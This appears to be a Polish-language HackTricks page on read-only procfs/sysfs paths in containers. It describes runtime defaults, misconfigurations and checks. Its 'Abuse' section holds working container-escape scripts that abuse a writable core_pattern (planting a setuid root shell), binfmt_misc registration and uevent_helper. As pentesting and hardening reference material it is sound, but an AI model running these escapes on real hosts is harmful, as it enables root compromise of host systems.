# Ścieżki systemowe tylko do odczytu

{{#include ../../../../banners/hacktricks-training.md}}

Ścieżki systemowe tylko do odczytu stanowią odrębną ochronę od ścieżek maskowanych. Zamiast całkowicie ukrywać ścieżkę, runtime udostępnia ją, ale montuje tylko do odczytu. Jest to typowe dla wybranych lokalizacji procfs i sysfs, gdzie dostęp do odczytu może być akceptowalny lub niezbędny operacyjnie, ale zapis byłby zbyt niebezpieczny.

Cel jest prosty: wiele interfejsów jądra staje się znacznie bardziej niebezpiecznych, gdy można w nich zapisywać. Montowanie tylko do odczytu nie usuwa całej wartości rozpoznawczej, ale uniemożliwia przejętemu workloadowi modyfikowanie plików związanych z jądrem za pośrednictwem tej ścieżki.

## Działanie

Runtime'y często oznaczają części widoku proc/sys jako tylko do odczytu. W zależności od runtime'u i hosta może to obejmować takie ścieżki jak:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Rzeczywista lista jest różna, ale model pozostaje taki sam: zapewnić widoczność tam, gdzie jest potrzebna, i domyślnie odmówić możliwości modyfikacji.

## Laboratorium

Sprawdź zadeklarowaną przez Docker listę ścieżek tylko do odczytu:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Sprawdź zamontowany widok proc/sys z wnętrza kontenera:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Wpływ na bezpieczeństwo

Ścieżki systemowe tylko do odczytu ograniczają dużą klasę nadużyć wpływających na hosta. Nawet gdy attacker może przeglądać procfs lub sysfs, brak możliwości zapisu usuwa wiele bezpośrednich ścieżek modyfikacji obejmujących kernel tunables, crash handlers, module-loading helpers oraz inne interfejsy sterujące. Ekspozycja nie znika, ale przejście od information disclosure do wpływu na hosta staje się trudniejsze.

## Błędne konfiguracje

Główne błędy to unmasking lub remounting wrażliwych ścieżek w trybie read-write, bezpośrednie udostępnianie zawartości hosta proc/sys za pomocą zapisywalnych bind mounts albo używanie trybów privileged, które skutecznie omijają bezpieczniejsze domyślne ustawienia runtime. W Kubernetes `procMount: Unmasked` i privileged workloads często występują razem ze słabszą ochroną proc. Innym częstym błędem operacyjnym jest założenie, że skoro runtime zwykle montuje te ścieżki w trybie read-only, wszystkie workloads nadal dziedziczą to ustawienie domyślne.

## Abuse

Jeśli ochrona jest słaba, zacznij od wyszukania zapisywalnych wpisów proc/sys:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Gdy obecne są wpisy umożliwiające zapis, wartościowe ścieżki dalszego działania obejmują:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Co mogą ujawnić te polecenia:

- Zapisywalne wpisy w `/proc/sys` często oznaczają, że kontener może modyfikować zachowanie jądra hosta, a nie tylko je sprawdzać.
- `core_pattern` jest szczególnie istotny, ponieważ zapisywalną wartość widoczną dla hosta można przekształcić w ścieżkę wykonania kodu na hoście poprzez doprowadzenie do awarii procesu po ustawieniu handlera potoku.
- `modprobe` ujawnia helper używany przez jądro w przepływach związanych z ładowaniem modułów; jest klasycznym celem o wysokiej wartości, gdy można go modyfikować.
- `binfmt_misc` informuje, czy możliwa jest rejestracja niestandardowych interpreterów. Jeśli rejestr jest zapisywalny, może stać się prymitywem wykonania, a nie tylko źródłem wycieku informacji.
- `panic_on_oom` kontroluje decyzję jądra dotyczącą całego hosta, dlatego wyczerpanie zasobów może przerodzić się w odmowę usługi hosta.
- `uevent_helper` jest jednym z najwyraźniejszych przykładów zapisywalnej ścieżki helpera sysfs prowadzącej do wykonania kodu w kontekście hosta.

Interesujące są zapisywalne ustawienia proc widoczne dla hosta lub wpisy sysfs, które normalnie powinny być tylko do odczytu. W tym momencie workload przestaje być ograniczonym widokiem kontenera i zaczyna uzyskiwać istotny wpływ na jądro.

### Pełny przykład: ucieczka z hosta przez `core_pattern`

Jeśli `/proc/sys/kernel/core_pattern` można modyfikować z wnętrza kontenera i wskazuje on na widok jądra hosta, można go wykorzystać do wykonania payloadu po awarii:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Jeśli ścieżka rzeczywiście dociera do kernela hosta, payload uruchamia się na hoście i pozostawia powłokę setuid.

### Pełny przykład: rejestracja `binfmt_misc`

Jeśli `/proc/sys/fs/binfmt_misc/register` jest zapisywalny, rejestracja niestandardowego interpretera może doprowadzić do wykonania kodu podczas uruchamiania pasującego pliku:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Na zapisywalnym `binfmt_misc` dostępnym z hosta wynikiem jest wykonanie kodu w ścieżce interpretera wywoływanej przez kernel.

### Pełny przykład: `uevent_helper`

Jeśli `/sys/kernel/uevent_helper` jest zapisywalny, kernel może wywołać helpera ze ścieżki hosta po uruchomieniu pasującego zdarzenia:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Powodem, dla którego jest to tak niebezpieczne, jest fakt, że ścieżka helpera jest rozwiązywana z perspektywy systemu plików hosta, a nie z bezpiecznego kontekstu ograniczonego wyłącznie do kontenera.

## Checks

Te checks określają, czy ekspozycja procfs/sysfs jest tylko do odczytu tam, gdzie jest to oczekiwane, oraz czy workload może nadal modyfikować wrażliwe interfejsy kernela.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Co jest tu interesujące:

- Zwykły hardened workload powinien udostępniać bardzo niewiele zapisywalnych wpisów proc/sys.
- Zapisywalne ścieżki `/proc/sys` są często ważniejsze niż zwykły dostęp tylko do odczytu.
- Jeśli runtime wskazuje, że ścieżka jest tylko do odczytu, ale w praktyce można w niej zapisywać, dokładnie przeanalizuj mount propagation, bind mounts oraz ustawienia uprawnień.

## Domyślne ustawienia runtime

| Runtime / platforma | Stan domyślny | Domyślne zachowanie | Częste ręczne osłabienie |
| --- | --- | --- | --- |
| Docker Engine | Włączone domyślnie | Docker definiuje domyślną listę ścieżek tylko do odczytu dla wrażliwych wpisów proc | exposing host proc/sys mounts, `--privileged` |
| Podman | Włączone domyślnie | Podman stosuje domyślne ścieżki tylko do odczytu, chyba że zostaną jawnie poluzowane | `--security-opt unmask=ALL`, broad host mounts, `--privileged` |
| Kubernetes | Dziedziczy ustawienia runtime | Używa modelu ścieżek tylko do odczytu bazowego runtime, chyba że zostanie on osłabiony przez ustawienia Pod lub host mounts | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Ustawienie runtime | Zwykle opiera się na domyślnych ustawieniach OCI/runtime | tak jak w wierszu Kubernetes; bezpośrednie zmiany konfiguracji runtime mogą osłabić to zachowanie |

Najważniejsze jest to, że ścieżki systemowe tylko do odczytu są zwykle dostępne jako domyślne ustawienie runtime, ale łatwo je podważyć za pomocą trybów uprzywilejowanych lub host bind mounts.
{{#include ../../../../banners/hacktricks-training.md}}
